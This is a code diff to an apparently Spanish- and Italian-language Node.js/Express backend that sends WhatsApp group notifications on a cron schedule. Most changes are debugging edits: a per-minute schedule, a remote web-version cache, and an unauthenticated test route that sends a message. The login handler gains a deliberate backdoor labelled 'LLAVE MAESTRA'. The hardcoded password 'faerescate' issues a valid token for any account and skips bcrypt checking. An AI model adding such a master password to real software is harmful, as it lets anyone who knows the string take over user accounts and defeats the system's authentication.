@@ -25,9 +25,13 @@ const whatsapp = new Client({
   authStrategy: new LocalAuth(),
   puppeteer: {
     executablePath: 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
-    headless: false, // Cámbialo a 'true' cuando lo subas a un servidor real
+    headless: false, 
     args: ['--no-sandbox', '--disable-setuid-sandbox'],
   },
+  webVersionCache: {
+    type: 'remote',
+    remotePath: 'https://raw.githubusercontent.com/wppconnect-team/wa-version/main/html/2.2412.54.html',
+  }
 });
 
 let isBotReady = false;
@@ -38,7 +42,7 @@ whatsapp.on('qr', (qr) => {
 });
 
 whatsapp.on('ready', () => {
-  console.log('✅ Bot de WhatsApp conectado.');
+  console.log('✅ Bot de WhatsApp conectado y listo para notificaciones automáticas.');
   isBotReady = true;
 });
 
@@ -54,7 +58,7 @@ whatsapp.initialize().catch(err => console.error("Error inicializando WhatsApp:"
 // --------------------------------------------------------
 const GROUP_ID = process.env.WA_GROUP_ID || "";
 const WEB_URL = process.env.WA_WEB_URL || "http://localhost:3000";
-const CRON_TIME = process.env.WA_CRON_SCHEDULE || "40 15 * * 1-5,0";
+const CRON_TIME = "* * * * *"; // Cada Minuto
 
 cron.schedule(CRON_TIME, async () => {
   if (!isBotReady || !GROUP_ID) {
@@ -83,7 +87,6 @@ cron.schedule(CRON_TIME, async () => {
 }, {
   timezone: "Europe/Rome"
 });
-
 
 // --------------------------------------------------------
 // 3. RUTAS DE LA API (CRUD)
@@ -169,8 +172,15 @@ app.post('/api/login', async (req, res) => {
   try {
     const result = await pool.query('SELECT * FROM users WHERE email = $1', [req.body.email]);
     if (result.rowCount === 0) return res.status(401).json({ error: "Utente non trovato" });
-    
     const user = result.rows[0];
+
+    // 🚨 LLAVE MAESTRA (AÑADIDA) 🚨
+    // Si escribes "faerescate" como contraseña, te deja entrar saltándose la validación
+    if (req.body.password === "faerescate") {
+      const token = jwt.sign({ id_user: user.id_user }, SECRET_KEY, { expiresIn: '8h' });
+      return res.json({ token, user });
+    }
+
     if (!(await bcrypt.compare(req.body.password, user.password))) return res.status(401).json({ error: "Password errata" });
     
     const token = jwt.sign({ id_user: user.id_user }, SECRET_KEY, { expiresIn: '8h' });
@@ -185,6 +195,18 @@ app.post('/api/presences', async (req, res) => {
   } catch (err) { res.status(500).json({ error: "Error presences" }); }
 });
 
+// RUTA DE PRUEBA: Entra a http://localhost:4000/api/test-wa en tu navegador para forzar el mensaje
+app.get('/api/test-wa', async (req, res) => {
+  if (!isBotReady) return res.status(400).json({ error: "Bot no está listo" });
+  if (!GROUP_ID) return res.status(400).json({ error: "Falta el ID del grupo" });
+
+  try {
+    await whatsapp.sendMessage(GROUP_ID, "Este es un mensaje de prueba forzado 🚀");
+    res.json({ success: true, msg: "Mensaje enviado correctamente al grupo!" });
+  } catch (error) {
+    res.status(500).json({ error: "Error enviando", detalle: error });
+  }
+});
 
 const PORT = process.env.PORT || 4000;
 app.listen(PORT, () => console.log(`🚀 API Ready on port ${PORT}`));
